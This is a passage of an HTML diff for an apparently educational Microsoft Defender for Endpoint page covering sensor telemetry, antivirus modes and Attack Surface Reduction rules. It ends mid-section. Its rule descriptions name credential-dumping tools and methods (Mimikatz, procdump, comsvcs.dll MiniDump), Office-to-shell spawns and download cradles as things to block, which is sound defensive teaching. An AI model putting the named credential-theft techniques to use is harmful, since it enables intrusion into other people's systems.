+      <button class="sim-btn" id="sim-play" onclick="startSimulation()">▶ Play</button>
+      <button class="sim-btn" id="sim-pause" onclick="togglePause()">⏸ Pause</button>
+      <button class="sim-btn" id="sim-next" onclick="nextStep()">⏭ Next Step</button>
+      <button class="sim-btn" id="sim-reset" onclick="resetSimulation()">↺ Reset</button>
+      <div class="sim-speed-controls">
+        <label>SPEED:</label>
+        <button class="speed-btn" onclick="setSpeed(0.5)" id="speed-slow">0.5×</button>
+        <button class="speed-btn active" onclick="setSpeed(1)" id="speed-normal">1×</button>
+        <button class="speed-btn" onclick="setSpeed(2)" id="speed-fast">2×</button>
+      </div>
+      <div class="sim-progress"><div class="sim-progress-bar" id="sim-progress-bar"></div></div>
+      <div class="sim-step-label" id="sim-step-label">Ready to start</div>
+    </div>
+
+    <div class="sim-grid">
+      <!-- ATTACKER PANEL -->
+      <div class="sim-panel panel-attacker" id="panel-attacker">
+        <div class="sim-panel-title"><span class="panel-dot"></span> Attacker Actions</div>
+        <div class="sim-log" id="log-attacker"></div>
+      </div>
+
+      <!-- CENTER: ENDPOINT VIEW -->
+      <div class="sim-panel panel-endpoint" id="panel-endpoint">
+        <div class="sim-panel-title"><span class="panel-dot"></span> Endpoint — DESKTOP-FIN01</div>
+        <div class="sim-visual">
+          <div class="sim-arrows">
+            <div class="sim-arrow-left" id="arrow-attack">
+              <span>Attack →</span>
+              <div class="arrow-particles"><div class="arrow-particle"></div><div class="arrow-particle"></div><div class="arrow-particle"></div></div>
+            </div>
+            <div class="sim-arrow-right" id="arrow-telemetry">
+              <div class="arrow-particles"><div class="arrow-particle"></div><div class="arrow-particle"></div><div class="arrow-particle"></div></div>
+              <span>→ Telemetry</span>
+            </div>
+          </div>
+          <div class="sim-device" id="sim-device">
+            <div class="device-icon">💻</div>
+            <div class="device-label">DESKTOP-FIN01</div>
+            <div class="device-status" id="device-status" style="background:rgba(34,197,94,.15);color:var(--green)">● Healthy</div>
+          </div>
+        </div>
+        <div class="sim-log" id="log-endpoint" style="max-height:180px"></div>
+      </div>
+
+      <!-- CLOUD PANEL -->
+      <div class="sim-panel panel-cloud" id="panel-cloud">
+        <div class="sim-panel-title"><span class="panel-dot"></span> Microsoft Cloud</div>
+        <div class="sim-log" id="log-cloud"></div>
+      </div>
+
+      <!-- SOC PANEL -->
+      <div class="sim-panel panel-soc" id="panel-soc">
+        <div class="sim-panel-title"><span class="panel-dot"></span> SOC / Defender Portal</div>
+        <div class="sim-log" id="log-soc"></div>
+      </div>
+    </div>
+
+    <div class="sim-narrative" id="sim-narrative">
+      <div class="narr-step">Welcome</div>
+      <div class="narr-text">Press <strong>▶ Play Simulation</strong> to watch a full attack get detected and stopped by MDE in real-time.</div>
+    </div>
+  </div>
+</section>
+
+<!-- SECTION 1: ENDPOINT SENSOR LAYER -->
+<section id="sensor">
+  <div class="grid-bg"></div>
+  <div class="section-inner">
+    <div class="section-label" style="background:var(--cyan-dim);color:var(--cyan)">⚡ Layer 1</div>
+    <h2 class="section-title fade-in">Endpoint Sensor Layer</h2>
+    <p class="section-desc fade-in">The <code style="color:var(--cyan)">MsSense.exe</code> sensor runs on each endpoint, hooking into the OS at the kernel and user-mode levels to collect behavioral telemetry. On Linux, it uses <strong>eBPF</strong> instead of kernel modules for stability.</p>
+
+    <div class="ticker-bar fade-in">
+      <div class="ticker-label">🔴 Simulated Telemetry Stream</div>
+      <div class="ticker-content" id="telemetry-ticker"></div>
+    </div>
+
+    <div class="sensor-grid">
+      <div class="card sensor-card expandable fade-in">
+        <div class="card-icon">📡</div>
+        <h3>ETW / eBPF — Process Events</h3>
+        <p>Hooks into kernel-level process creation callbacks and ETW providers. On Linux, uses eBPF tracepoints attached to syscalls.</p>
+        <span class="tag">DeviceProcessEvents</span>
+        <div class="expand-toggle">Click for details</div>
+        <div class="expand-content"><ul class="detail-list">
+          <li>Full command-line arguments for every process</li>
+          <li>Parent-child process relationships (process tree)</li>
+          <li>SHA1 / SHA256 file hashes at creation</li>
+          <li>Account name, SID, and token elevation status</li>
+          <li>Timestamp with millisecond precision</li>
+          <li>Internal throttling prevents duplicate event flooding</li>
+        </ul></div>
+      </div>
+
+      <div class="card sensor-card expandable fade-in">
+        <div class="card-icon">📁</div>
+        <h3>Minifilter Driver — File Events</h3>
+        <p>A file system minifilter driver intercepts all file I/O operations. On Linux, fanotify and eBPF provide equivalent coverage.</p>
+        <span class="tag">DeviceFileEvents</span>
+        <div class="expand-toggle">Click for details</div>
+        <div class="expand-content"><ul class="detail-list">
+          <li>File creates, modifications, deletes, renames</li>
+          <li>Full file path, size, and hash</li>
+          <li>Which process performed the operation</li>
+          <li>Detects file drops in temp/startup folders</li>
+          <li>Tracks ransomware-like bulk encryption patterns</li>
+        </ul></div>
+      </div>
+
+      <div class="card sensor-card expandable fade-in">
+        <div class="card-icon">🌐</div>
+        <h3>WFP / Socket Hooks — Network Events</h3>
+        <p>Windows Filtering Platform callouts capture all network connections. Full visibility into outbound/inbound traffic without packet capture overhead.</p>
+        <span class="tag">DeviceNetworkEvents</span>
+        <div class="expand-toggle">Click for details</div>
+        <div class="expand-content"><ul class="detail-list">
+          <li>Remote IP address, port, protocol (TCP/UDP)</li>
+          <li>Remote URL and DNS query resolution</li>
+          <li>Which process initiated the connection</li>
+          <li>Bytes sent/received</li>
+          <li>Connection direction (inbound/outbound)</li>
+          <li>SmartScreen reputation checked for URLs</li>
+        </ul></div>
+      </div>
+
+      <div class="card sensor-card expandable fade-in">
+        <div class="card-icon">🗝️</div>
+        <h3>Registry Callbacks — Registry Events</h3>
+        <p>CmRegisterCallbackEx kernel callbacks monitor all registry key and value operations — critical for detecting persistence mechanisms.</p>
+        <span class="tag">DeviceRegistryEvents</span>
+        <div class="expand-toggle">Click for details</div>
+        <div class="expand-content"><ul class="detail-list">
+          <li>Key/value creates, modifications, deletes</li>
+          <li>Run/RunOnce keys (persistence)</li>
+          <li>Services registry modifications</li>
+          <li>COM object hijacking detection</li>
+          <li>Full registry path, value name, and value data</li>
+        </ul></div>
+      </div>
+
+      <div class="card sensor-card expandable fade-in">
+        <div class="card-icon">🔍</div>
+        <h3>AMSI — Script Content Capture</h3>
+        <p>Antimalware Scan Interface captures <strong>deobfuscated</strong> script content from PowerShell, VBScript, JScript, and Office VBA — sees the actual code after decoding.</p>
+        <span class="tag">DeviceEvents</span>
+        <div class="expand-toggle">Click for details</div>
+        <div class="expand-content"><ul class="detail-list">
+          <li>PowerShell script block logging (full content)</li>
+          <li>VBScript and JScript runtime inspection</li>
+          <li>Office VBA macro content analysis</li>
+          <li>Bypasses Base64/encoding obfuscation</li>
+          <li>Paired with cloud ML models for classification</li>
+        </ul></div>
+      </div>
+
+      <div class="card sensor-card expandable fade-in">
+        <div class="card-icon">👤</div>
+        <h3>LSA / Security Events — Logon Events</h3>
+        <p>Hooks into the Local Security Authority to capture all authentication events including interactive, RDP, network, and service logons.</p>
+        <span class="tag">DeviceLogonEvents</span>
+        <div class="expand-toggle">Click for details</div>
+        <div class="expand-content"><ul class="detail-list">
+          <li>Logon type (interactive, RDP, network, service, batch)</li>
+          <li>Success and failure events with reason codes</li>
+          <li>Account name, domain, SID</li>
+          <li>Remote IP for network logons</li>
+          <li>Detects brute force and credential spraying patterns</li>
+        </ul></div>
+      </div>
+
+      <div class="card sensor-card expandable fade-in">
+        <div class="card-icon">📦</div>
+        <h3>Image Load Notifications — DLL Events</h3>
+        <p>Kernel-level image load notifications track every DLL loaded into any process — essential for detecting DLL sideloading and injection.</p>
+        <span class="tag">DeviceImageLoadEvents</span>
+        <div class="expand-toggle">Click for details</div>
+        <div class="expand-content"><ul class="detail-list">
+          <li>DLL file path and hash</li>
+          <li>Digital signature and signer name</li>
+          <li>Process that loaded the DLL</li>
+          <li>Detects unsigned DLLs in signed process spaces</li>
+          <li>DLL search order hijacking detection</li>
+        </ul></div>
+      </div>
+
+      <div class="card sensor-card expandable fade-in">
+        <div class="card-icon">🧠</div>
+        <h3>Kernel & Memory Manager — Deep Optics</h3>
+        <p>Deep instrumentation into the kernel memory manager detects process injection techniques like VirtualAlloc, WriteProcessMemory, CreateRemoteThread chains.</p>
+        <span class="tag">DeviceEvents</span>
+        <div class="expand-toggle">Click for details</div>
+        <div class="expand-content"><ul class="detail-list">
+          <li>Process hollowing detection</li>
+          <li>Remote thread creation monitoring</li>
+          <li>Memory allocation pattern analysis</li>
+          <li>Shellcode injection detection</li>
+          <li>Credential dumping from LSASS memory</li>
+        </ul></div>
+      </div>
+    </div>
+
+    <div class="why-box fade-in">
+      <div class="why-title">💡 Why the Sensor Layer Matters</div>
+      <div class="why-grid">
+        <div class="why-item"><div class="why-icon">🎯</div><div class="why-content"><h4>Visibility You Can't Get Elsewhere</h4><p>Without kernel-level hooks, you're blind to process injection, fileless attacks, and in-memory malware. Traditional antivirus only sees files on disk — MDE sees <em>behavior</em>.</p></div></div>
+        <div class="why-item"><div class="why-icon">⚡</div><div class="why-content"><h4>Real-Time, Not After-the-Fact</h4><p>The sensor streams telemetry as events happen — not from periodic log collection. This is what enables sub-minute detection of attacks in progress.</p></div></div>
+        <div class="why-item"><div class="why-icon">🔗</div><div class="why-content"><h4>Complete Process Trees</h4><p>Every process has a parent. The sensor captures the full chain — so when PowerShell spawns from Word, you see the entire kill chain, not just an isolated alert.</p></div></div>
+        <div class="why-item"><div class="why-icon">📊</div><div class="why-content"><h4>Low Overhead (~5-20 MB/day)</h4><p>Enterprise-grade telemetry with minimal network and performance impact. The sensor deduplicates and throttles to prevent flooding — you get signal, not noise.</p></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- SECTION: MICROSOFT DEFENDER ANTIVIRUS (MDAV) -->
+<section id="mdav" style="background:var(--bg2)">
+  <div class="section-inner">
+    <div class="section-label" style="background:rgba(59,130,246,.15);color:var(--blue)">🛡️ Prevention Pillar 1</div>
+    <h2 class="section-title fade-in">Microsoft Defender Antivirus (MDAV)</h2>
+    <p class="section-desc fade-in">MDAV is the next-generation antivirus engine built into Windows. It's NOT just signature-based AV — it uses <strong>local ML models, cloud-delivered protection, behavior monitoring, and emulation</strong> to catch threats traditional AV misses. It's the first line of defense before EDR even kicks in.</p>
+
+    <h3 class="fade-in" style="color:var(--blue);margin-bottom:1.25rem;font-size:1.05rem">⚙️ How MDAV Works — The Protection Stack</h3>
+
+    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:1.25rem">
+      <div class="card expandable fade-in" style="border-top:3px solid var(--blue)">
+        <div style="display:flex;gap:.75rem;align-items:center"><div style="font-size:1.4rem">📡</div><div><strong>Real-Time Protection</strong></div></div>
+        <p style="font-size:.82rem;margin-top:.35rem;color:var(--text-dim)">Always-on scanning using file and process behavior monitoring. Intercepts files at creation, execution, and modification.</p>
+        <span class="tag" style="background:rgba(59,130,246,.1);color:var(--blue)">Always On</span>
+        <div class="expand-toggle">How it works →</div>
+        <div class="expand-content"><ul class="detail-list">
+          <li><strong>On-access scanning:</strong> Every file opened/created is scanned before the process can use it</li>
+          <li><strong>Behavior monitoring:</strong> Watches API calls, memory operations, and file system activity for malicious patterns</li>
+          <li><strong>Process monitoring:</strong> Tracks process creation chains — Word→PowerShell triggers immediate analysis</li>
+          <li>If real-time protection is disabled, MDE generates an alert — tamper protection prevents unauthorized changes</li>
+          <li><strong>Performance tip:</strong> Use exclusions for known-safe high-I/O paths (e.g., database files) to reduce scan overhead</li>
+        </ul></div>
+      </div>
+
+      <div class="card expandable fade-in" style="border-top:3px solid var(--cyan)">
+        <div style="display:flex;gap:.75rem;align-items:center"><div style="font-size:1.4rem">☁️</div><div><strong>Cloud-Delivered Protection</strong></div></div>
+        <p style="font-size:.82rem;margin-top:.35rem;color:var(--text-dim)">When a file is unknown locally, metadata (or the file itself) is sent to Microsoft's cloud for deep ML analysis. Verdict returns in milliseconds.</p>
+        <span class="tag" style="background:rgba(0,229,255,.1);color:var(--cyan)">Near Instant</span>
+        <div class="expand-toggle">How it works →</div>
+        <div class="expand-content"><ul class="detail-list">
+          <li><strong>"Block at first sight":</strong> Unknown files are HELD from executing while the cloud analyzes them</li>
+          <li>Cloud uses deep neural networks, detonation sandboxes, and reputation data from 78T daily signals</li>
+          <li>Verdict (allow/block) returns within seconds — user experiences minimal delay</li>
+          <li><strong>Cloud protection level:</strong> Default, High, High+, Zero Tolerance — higher levels increase cloud analysis aggressiveness</li>
+          <li><strong>Extended timeout:</strong> Configure up to 60 seconds for cloud analysis of suspicious files</li>
+          <li><strong>Requires connectivity:</strong> If the device can't reach the cloud, it falls back to local engines only</li>
+        </ul></div>
+      </div>
+
+      <div class="card expandable fade-in" style="border-top:3px solid var(--green)">
+        <div style="display:flex;gap:.75rem;align-items:center"><div style="font-size:1.4rem">🔄</div><div><strong>Security Intelligence Updates</strong></div></div>
+        <p style="font-size:.82rem;margin-top:.35rem;color:var(--text-dim)">Signature and ML model updates delivered multiple times per day. Emergency dynamic updates for critical threats in minutes.</p>
+        <span class="tag" style="background:rgba(34,197,94,.1);color:var(--green)">Auto-Update</span>
+        <div class="expand-toggle">How it works →</div>
+        <div class="expand-content"><ul class="detail-list">
+          <li><strong>Security intelligence:</strong> Traditional signatures + ML model updates — delivered 3-4 times per day</li>
+          <li><strong>Platform updates:</strong> Engine and component updates — monthly via Windows Update</li>
+          <li><strong>Emergency updates:</strong> Cloud-delivered dynamic intelligence for critical threats — deployed in minutes globally</li>
+          <li><strong>Update sources:</strong> Windows Update, WSUS, SCCM/Intune, or direct from Microsoft Update</li>
+          <li><strong>Outdated sigs = risk:</strong> Defender for Cloud generates an alert if signatures are more than 7 days old</li>
+        </ul></div>
+      </div>
+
+      <div class="card expandable fade-in" style="border-top:3px solid var(--orange)">
+        <div style="display:flex;gap:.75rem;align-items:center"><div style="font-size:1.4rem">🐾</div><div><strong>PUA Protection</strong></div></div>
+        <p style="font-size:.82rem;margin-top:.35rem;color:var(--text-dim)">Potentially Unwanted Applications — adware, bundleware, browser toolbars, crypto-miners. Not malware, but unwanted.</p>
+        <span class="tag" style="background:rgba(249,115,22,.1);color:var(--orange)">Optional</span>
+        <div class="expand-toggle">How it works →</div>
+        <div class="expand-content"><ul class="detail-list">
+          <li>Modes: Block (quarantine), Audit (log only), Disabled</li>
+          <li>Detects: adware, bundlers, crypto-miners, browser modifiers, torrent software</li>
+          <li>Configure via: Intune, Group Policy, PowerShell (Set-MpPreference -PUAProtection Enabled)</li>
+          <li>Important for compliance — many frameworks require PUA blocking</li>
+        </ul></div>
+      </div>
+    </div>
+
+    <h3 class="fade-in" style="color:var(--blue);margin:2.5rem 0 1rem;font-size:1.05rem">🔀 MDAV Operating Modes</h3>
+    <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:1.25rem" class="fade-in">
+      <div class="card" style="text-align:center;padding:1.5rem;border-top:3px solid var(--green)">
+        <div style="font-size:2rem;margin-bottom:.5rem">✅</div>
+        <h3 style="color:var(--green)">Active Mode</h3>
+        <p style="font-size:.82rem">Primary AV. Real-time protection ON. Scans and remediates threats. Full protection. This is the default and recommended mode.</p>
+      </div>
+      <div class="card" style="text-align:center;padding:1.5rem;border-top:3px solid var(--yellow)">
+        <div style="font-size:2rem;margin-bottom:.5rem">⏸️</div>
+        <h3 style="color:var(--yellow)">Passive Mode</h3>
+        <p style="font-size:.82rem">Third-party AV is primary. MDAV still scans but does NOT remediate. EDR detection still works. Required for AIR to function. Triggered automatically when another AV is detected.</p>
+      </div>
+      <div class="card" style="text-align:center;padding:1.5rem;border-top:3px solid var(--red)">
+        <div style="font-size:2rem;margin-bottom:.5rem">⛔</div>
+        <h3 style="color:var(--red)">Disabled</h3>
+        <p style="font-size:.82rem">AV completely off. NO scanning, NO EDR behavioral monitoring, NO AIR. Tamper protection prevents this. If MDAV is disabled, Automated Investigation and Response will NOT function.</p>
+      </div>
+    </div>
+
+    <div class="card fade-in" style="margin-top:2rem;border-left:3px solid var(--yellow);padding:1.5rem">
+      <h3 style="color:var(--yellow);margin-bottom:.75rem">⚠️ Key Configuration Gotchas</h3>
+      <div style="font-size:.85rem;color:var(--text-dim);line-height:2">
+        <div>• <strong>Tamper protection:</strong> Prevents unauthorized changes to AV settings. Enable it — attackers' first move is often disabling AV</div>
+        <div>• <strong>Exclusions are dangerous:</strong> Every exclusion is a blind spot. Attackers actively look for excluded paths to hide malware. Never exclude entire drives or common folders like C:\Windows\Temp</div>
+        <div>• <strong>Cloud protection MUST be on:</strong> Without it, you lose "block at first sight" and cloud ML — your protection drops significantly against zero-day threats</div>
+        <div>• <strong>Passive mode + EDR:</strong> If you run CrowdStrike as primary AV, MDAV goes passive. EDR (MDE sensor) still works but AIR requires MDAV in active or passive — NOT disabled</div>
+        <div>• <strong>Sample submission:</strong> Enable automatic sample submission — this is how Microsoft trains ML models. Without it, your protection is weaker</div>
+        <div>• <strong>Scan type:</strong> Quick scan checks common malware locations (~1-2 min). Full scan checks everything (~1-4 hours). Schedule full scans weekly during off-hours</div>
+      </div>
+    </div>
+
+    <div class="why-box fade-in">
+      <div class="why-title">💡 Why MDAV Matters (It's Not Just "Antivirus")</div>
+      <div class="why-grid">
+        <div class="why-item"><div class="why-icon">🧬</div><div class="why-content"><h4>8 Detection Engines, Not Just Signatures</h4><p>Traditional AV = signatures. MDAV = signatures + local ML + cloud ML + heuristics + emulation + behavior monitoring + AMSI + memory scanning. It catches polymorphic and zero-day malware that signature-only AV misses completely.</p></div></div>
+        <div class="why-item"><div class="why-icon">⚡</div><div class="why-content"><h4>Built Into Windows = Zero Deployment</h4><p>No agent to install, no compatibility issues, no performance overhead from a third-party hooking into the kernel. It's already there on every Windows machine. One toggle in Intune enables it enterprise-wide.</p></div></div>
+        <div class="why-item"><div class="why-icon">🔗</div><div class="why-content"><h4>Feeds the Entire MDE Stack</h4><p>MDAV detections feed into EDR alerts, AIR investigations, Advanced Hunting tables, and the Intelligent Security Graph. Replace it with CrowdStrike AV and you lose this native data pipeline.</p></div></div>
+        <div class="why-item"><div class="why-icon">🛡️</div><div class="why-content"><h4>EDR in Block Mode</h4><p>Even in passive mode (third-party AV is primary), MDAV can block threats detected by EDR. Called "EDR in block mode" — the EDR detection triggers MDAV to remediate even when it's not the primary AV. Best of both worlds.</p></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- SECTION: ATTACK SURFACE REDUCTION (ASR) -->
+<section id="asr">
+  <div class="section-inner">
+    <div class="section-label" style="background:rgba(249,115,22,.15);color:var(--orange)">🧱 Prevention Pillar 2</div>
+    <h2 class="section-title fade-in">Attack Surface Reduction (ASR)</h2>
+    <p class="section-desc fade-in">ASR is a collection of <strong>hardening rules and controls</strong> that block specific attack techniques BEFORE they succeed. While MDAV catches malware, ASR prevents the attack behaviors that LEAD to malware — like Office spawning PowerShell, or credential theft from LSASS.</p>
+
+    <h3 class="fade-in" style="color:var(--orange);margin-bottom:1.25rem;font-size:1.05rem">📋 ASR Rules — The Key Rules You Must Know</h3>
+    <div class="comp-grid">
+      <div class="card expandable fade-in" style="border-left:3px solid var(--red)">
+        <h3 style="font-size:.9rem;color:var(--red)">Block Office apps from creating child processes</h3>
+        <p style="font-size:.8rem;color:var(--text-dim)">Prevents Word/Excel/PowerPoint from spawning cmd.exe, powershell.exe, etc. This kills 90% of macro-based attacks.</p>
+        <span class="tag" style="background:rgba(239,68,68,.1);color:var(--red)">Critical</span>
+        <div class="expand-toggle">Details →</div>
+        <div class="expand-content"><ul class="detail-list">
+          <li>GUID: d4f940ab-401b-4efc-aadc-ad5f3c50688a</li>
+          <li>Blocks: Word→powershell.exe, Excel→cmd.exe, PowerPoint→mshta.exe</li>
+          <li>Does NOT block: Office opening other Office apps, or legitimate add-ins</li>
+          <li>False positive risk: Low — legitimate Office workflows rarely spawn shell processes</li>
+          <li><strong>Deploy in Audit mode first</strong> for 2 weeks, check for false positives, then switch to Block</li>
+        </ul></div>
+      </div>
+
+      <div class="card expandable fade-in" style="border-left:3px solid var(--red)">
+        <h3 style="font-size:.9rem;color:var(--red)">Block credential stealing from LSASS</h3>
+        <p style="font-size:.8rem;color:var(--text-dim)">Prevents processes from accessing LSASS memory to dump credentials. Stops Mimikatz, procdump, comsvcs.dll MiniDump.</p>
+        <span class="tag" style="background:rgba(239,68,68,.1);color:var(--red)">Critical</span>
+        <div class="expand-toggle">Details →</div>
+        <div class="expand-content"><ul class="detail-list">
+          <li>GUID: 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2</li>
+          <li>Blocks: Any process opening LSASS with read-memory permissions</li>
+          <li>Works alongside Credential Guard (which uses virtualization to protect LSASS)</li>
+          <li>False positive risk: Medium — some legitimate security tools access LSASS (antivirus, DLP agents)</li>
+          <li>If a legitimate tool is blocked, add a per-process exclusion — NOT a global disable</li>
+        </ul></div>
+      </div>
+
+      <div class="card expandable fade-in" style="border-left:3px solid var(--orange)">
+        <h3 style="font-size:.9rem;color:var(--orange)">Block executable content from email</h3>
+        <p style="font-size:.8rem;color:var(--text-dim)">Prevents email clients and webmail from running downloaded executables, scripts, and DLLs.</p>
+        <span class="tag" style="background:rgba(249,115,22,.1);color:var(--orange)">High Value</span>
+        <div class="expand-toggle">Details →</div>
+        <div class="expand-content"><ul class="detail-list">
+          <li>GUID: be9ba2d9-53ea-4cdc-84e5-9b1eeee46550</li>
+          <li>Blocks: .exe, .dll, .scr files dropped by Outlook, Thunderbird, webmail</li>
+          <li>Does NOT block: .docx, .pdf, .xlsx (those are handled by other rules)</li>
+          <li>Works with Outlook desktop — webmail coverage depends on browser integration</li>
+        </ul></div>
+      </div>
+
+      <div class="card expandable fade-in" style="border-left:3px solid var(--orange)">
+        <h3 style="font-size:.9rem;color:var(--orange)">Block process creations from PSExec and WMI</h3>
+        <p style="font-size:.8rem;color:var(--text-dim)">Prevents PSExec and WMI from creating new processes — key lateral movement tools.</p>
+        <span class="tag" style="background:rgba(249,115,22,.1);color:var(--orange)">Lateral Movement</span>
+        <div class="expand-toggle">Details →</div>
+        <div class="expand-content"><ul class="detail-list">
+          <li>GUID: d1e49aac-8f56-4280-b9ba-993a6d77406c</li>
+          <li>Blocks: PsExec.exe and WMI remote process creation (wmiprvse.exe → child process)</li>
+          <li>False positive risk: HIGH — many management tools use WMI and PSExec legitimately (SCCM, monitoring)</li>
+          <li><strong>Must run in Audit mode extensively</strong> before enabling Block — check with IT ops team first</li>
+          <li>Exclusions may be needed for specific management servers</li>
+        </ul></div>
+      </div>
+
+      <div class="card expandable fade-in" style="border-left:3px solid var(--yellow)">
+        <h3 style="font-size:.9rem;color:var(--yellow)">Block JavaScript or VBScript from launching downloaded content</h3>
+        <p style="font-size:.8rem;color:var(--text-dim)">Prevents scripts from executing payloads they downloaded from the internet.</p>
+        <span class="tag" style="background:rgba(234,179,8,.1);color:var(--yellow)">Download Cradles</span>
+        <div class="expand-toggle">Details →</div>
+        <div class="expand-content"><ul class="detail-list">
+          <li>GUID: d3e037e1-3eb8-44c8-a917-57927947596d</li>
+          <li>Blocks the "download cradle" pattern: script downloads .exe → script executes .exe</li>
+          <li>Commonly used in phishing: user runs .js file from email → script downloads malware → script runs it</li>
+          <li>False positive risk: Low — legitimate scripts rarely download and execute binaries</li>
+        </ul></div>
+      </div>
+
+      <div class="card expandable fade-in" style="border-left:3px solid var(--yellow)">
+        <h3 style="font-size:.9rem;color:var(--yellow)">Use advanced protection against ransomware</h3>
+        <p style="font-size:.8rem;color:var(--text-dim)">Uses cloud-delivered protection to block files that look like ransomware based on reputation and ML analysis.</p>
+        <span class="tag" style="background:rgba(234,179,8,.1);color:var(--yellow)">Ransomware</span>
+        <div class="expand-toggle">Details →</div>
+        <div class="expand-content"><ul class="detail-list">
+          <li>GUID: c1db55ab-c21a-4637-bb3f-a12568109d35</li>
+          <li>Cloud ML evaluates files for ransomware characteristics before allowing execution</li>
+          <li>Requires cloud-delivered protection to be enabled (depends on cloud connectivity)</li>
+          <li>Works alongside Controlled Folder Access for defense-in-depth against ransomware</li>
+        </ul></div>
+      </div>
+    </div>
+
+    <h3 class="fade-in" style="color:var(--orange);margin:2.5rem 0 1rem;font-size:1.05rem">🧱 Other ASR Components (Beyond Rules)</h3>
+    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:1.25rem">
+      <div class="card expandable fade-in" style="border-top:3px solid var(--green)">
+        <div style="display:flex;gap:.75rem;align-items:center"><div style="font-size:1.4rem">📁</div><div><strong>Controlled Folder Access</strong></div></div>
+        <p style="font-size:.82rem;margin-top:.35rem;color:var(--text-dim)">Whitelists which processes can write to protected folders. Blocks ransomware from encrypting Documents, Desktop, etc.</p>
+        <div class="expand-toggle">Configuration →</div>
+        <div class="expand-content"><ul class="detail-list">
+          <li>Default protected folders: Documents, Pictures, Videos, Desktop, Favorites</li>
+          <li>Add custom folders: Set-MpPreference -ControlledFolderAccessProtectedFolders "C:\Finance"</li>
+          <li>Allow specific apps: Set-MpPreference -ControlledFolderAccessAllowedApplications "C:\Apps\MyApp.exe"</li>
+          <li><strong>Gotcha:</strong> Many legitimate apps get blocked — LOB apps, backup software, development tools. Test in Audit mode first</li>
+          <li><strong>Gotcha:</strong> Only works when MDAV is in Active mode (not passive)</li>
+        </ul></div>
+      </div>
+
+      <div class="card expandable fade-in" style="border-top:3px solid var(--purple)">
+        <div style="display:flex;gap:.75rem;align-items:center"><div style="font-size:1.4rem">🛡️</div><div><strong>Exploit Protection</strong></div></div>
+        <p style="font-size:.82rem;margin-top:.35rem;color:var(--text-dim)">Per-process mitigations that make memory corruption exploits fail: DEP, ASLR, CFG, heap randomization.</p>
+        <div class="expand-toggle">Configuration →</div>
+        <div class="expand-content"><ul class="detail-list">
+          <li><strong>System-level:</strong> DEP (always on), SEHOP, ASLR (force randomization), CFG (Control Flow Guard)</li>
+          <li><strong>Per-process:</strong> Override mitigations for specific apps (e.g., enable strict ASLR for Chrome)</li>
+          <li>Export/import settings as XML for deployment via Intune or GPO</li>
+          <li><strong>Gotcha:</strong> Some older apps crash with forced ASLR — test per-app overrides before deploying</li>
+          <li>Replaces the old EMET (Enhanced Mitigation Experience Toolkit)</li>
+        </ul></div>
+      </div>
+
+      <div class="card expandable fade-in" style="border-top:3px solid var(--blue)">
+        <div style="display:flex;gap:.75rem;align-items:center"><div style="font-size:1.4rem">🌐</div><div><strong>Network Protection</strong></div></div>
+        <p style="font-size:.82rem;margin-top:.35rem;color:var(--text-dim)">Blocks outbound connections to malicious/phishing domains and IPs. Uses SmartScreen reputation data. Works at the network layer — catches all apps, not just browsers.</p>
+        <div class="expand-toggle">Configuration →</div>
+        <div class="expand-content"><ul class="detail-list">
+          <li>Modes: Block, Audit, Disabled. Set via: Set-MpPreference -EnableNetworkProtection Enabled</li>
+          <li>Uses SmartScreen reputation from the Intelligent Security Graph (78T signals)</li>
+          <li><strong>Key difference from SmartScreen:</strong> SmartScreen protects browsers only. Network Protection protects ALL processes</li>
+          <li>Blocks: known C2 servers, phishing domains, malware distribution sites</li>
+          <li><strong>Gotcha:</strong> Can block legitimate sites if reputation is wrong — check Network Protection events in portal</li>
+          <li>Web content filtering (URL categories) is also built into Network Protection</li>
+        </ul></div>
+      </div>
+
+      <div class="card expandable fade-in" style="border-top:3px solid var(--cyan)">
+        <div style="display:flex;gap:.75rem;align-items:center"><div style="font-size:1.4rem">🔌</div><div><strong>Device Control</strong></div></div>
+        <p style="font-size:.82rem;margin-top:.35rem;color:var(--text-dim)">Controls USB/removable media — block, allow read-only, or audit by device class, vendor ID, or serial number.</p>
+        <div class="expand-toggle">Configuration →</div>
+        <div class="expand-content"><ul class="detail-list">
+          <li>Policies via Intune: Device Installation → Device Restrictions → Removable Storage</li>
+          <li>Granular: allow specific approved USB drives by hardware ID, block everything else</li>
+          <li>Options: block entirely, allow read-only, allow read-write for specific devices, audit only</li>
+          <li><strong>Gotcha:</strong> Blocking USB can break keyboards, mice, and headsets if rules are too broad — use device class filtering</li>
+          <li>MDE generates alerts in DeviceEvents for removable media activity</li>
+        </ul></div>
+      </div>
+    </div>
+
+    <div class="card fade-in" style="margin-top:2rem;border-left:3px solid var(--orange);padding:1.5rem">
+      <h3 style="color:var(--orange);margin-bottom:.75rem">🚀 ASR Deployment Best Practice</h3>
+      <div style="font-size:.85rem;color:var(--text-dim);line-height:2">
+        <div><strong style="color:var(--text)">Phase 1 — Audit (2-4 weeks):</strong> Enable ALL ASR rules in Audit mode. Monitor Reports → Attack Surface Reduction in the Defender portal. Identify false positives.</div>
+        <div><strong style="color:var(--text)">Phase 2 — Warn (1-2 weeks):</strong> Switch high-confidence rules to Warn mode. Users see a notification but can bypass. Validates that blocks won't break workflows.</div>
+        <div><strong style="color:var(--text)">Phase 3 — Block:</strong> Enable Block mode for rules with zero/low false positives. Add per-file/per-process exclusions for legitimate business apps that trigger rules.</div>
+        <div><strong style="color:var(--text)">Phase 4 — Monitor:</strong> Continuously monitor ASR events. New apps and workflows may trigger rules. Review monthly.</div>
+        <div style="margin-top:.5rem;color:var(--yellow)">⚠️ <strong>NEVER go straight to Block mode without Audit first.</strong> You WILL break business applications. The #1 reason ASR deployments fail is skipping the Audit phase.</div>
+      </div>
+    </div>
+
+    <div class="why-box fade-in">
+      <div class="why-title">💡 Why ASR Is the Most Underused MDE Feature</div>
+      <div class="why-grid">
+        <div class="why-item"><div class="why-icon">🛡️</div><div class="why-content"><h4>Prevention > Detection</h4><p>EDR detects attacks. ASR PREVENTS them. Blocking Office from spawning PowerShell stops the attack before malware ever executes. The best alert is the one that never fires because the attack was blocked.</p></div></div>
